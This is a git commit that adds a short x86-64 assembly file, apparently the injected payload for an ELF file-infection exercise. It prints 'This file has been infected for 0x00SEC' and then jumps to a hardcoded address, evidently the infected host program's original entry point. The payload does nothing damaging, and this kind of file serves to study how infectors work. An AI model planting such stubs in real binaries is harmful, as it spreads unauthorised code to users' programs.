d87dc9f3e108518bf9385e7eebbdea3c762fc996
Sam <24442697+digitalXmage@users.noreply.github.com>
2020-08-15 11:22:34 +0100

    Add files via upload

---
+++ payload2.s
@@ -0,0 +1,18 @@
+section .text
+        global _start
+
+_start:
+        mov rax,1       ; [1] - sys_write
+        mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
+        lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
+        mov rdx, msg_end - msg      ; msg size
+        syscall         ; calls the function stored in rax
+
+;	mov rax,8
+;	ret 
+	mov rax, 0x1050
+	jmp rax
+
+align 8
+        msg     db 'This file has been infected for 0x00SEC',0x0a,0
+	msg_end db 0x0
